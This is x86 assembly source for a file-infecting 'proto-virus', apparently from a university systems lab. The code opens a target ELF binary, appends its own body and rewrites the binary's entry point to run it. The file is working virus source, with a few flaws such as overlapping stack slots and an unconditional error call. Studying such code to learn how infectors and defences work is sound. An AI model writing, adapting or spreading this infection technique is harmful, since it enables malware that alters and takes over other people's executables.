%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28
%define STDOUT 1
%define FD [ebp-4]
%define buffer [ebp-8]
%define FileSize [ebp-12]
%define virus_size [ebp-14]
%define header_buffer [ebp-18]
%define old_entry [ebp-22]
	
	global _start

	section .text
_start:	
	push	ebp
	mov	    ebp, esp
	sub	    esp, STK_RES                ; Set up ebp and reserve space on the stack for local storage
	;CODE START
    call    get_my_loc
    sub     ecx, next_i-OutStr
    write   STDOUT, ecx, 31             ; print the virus
	call    get_my_loc
	sub     ecx, next_i - FileName
	mov     eax, ecx
	open    eax, RDWR, 0777             ; open file

    mov     FD, eax                     ; save FD in stack
    lea     ebx, buffer                 ; point to buffer
    read    eax, ebx, 4                 ; read the magic number (first 4 bytes, ".ELF")
    cmp     dword buffer, 0x464c457f    ; compare magic number
    jne     not_ELF                     ; if not ELF, jump to close
    mov     eax, FD
    lseek   eax, 0, SEEK_END            ; go to end of file
    mov     eax, (virus_end - _start)   ; save size of the file in eax
    mov     virus_size, eax             ; save size of file on stack

    call    get_my_loc
    sub     ecx, next_i-_start          ; save size of the virus

    mov     ebx, FD                     ; save pointer to file in ebx
    mov     edx, eax                    ; move the size of the file to edx for the write
    write   ebx, ecx, edx               ; write to virus to the infected file

    lseek   ebx, 0, SEEK_SET            ; go to start of file
    lea     ecx, header_buffer          ; get address of the header file
    read    ebx, ecx, ELFHDR_size       ; read header of the infected file
    lea     ecx, header_buffer          ; get back address of header file after read
    mov     eax, dword[ecx+24]          ; get old entry point
    mov     old_entry, eax              ; save it on stack
    mov     dword[ecx+24], 0x08048294   ; move to the entry point of the infected file - _start

    mov     ebx, FD
    lseek   ebx, 0, SEEK_SET            ; get start of the file
    lea     ecx, header_buffer          ; get address of header buffer
    mov     edx, ELFHDR_size            ; move size of buffer to edx
    write   ebx, ecx, edx               ; write fixed header to file
    not_ELF:
    close   ebx                         ;close file

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)

error_check:
    cmp eax, -1
    call    error

error:
    call    get_my_loc
    add     ecx, Failstr
    write   1, ecx, 12
    exit    -1

FileName:	db "ELFexec1", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:    db "perhaps not", 10 , 0
	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


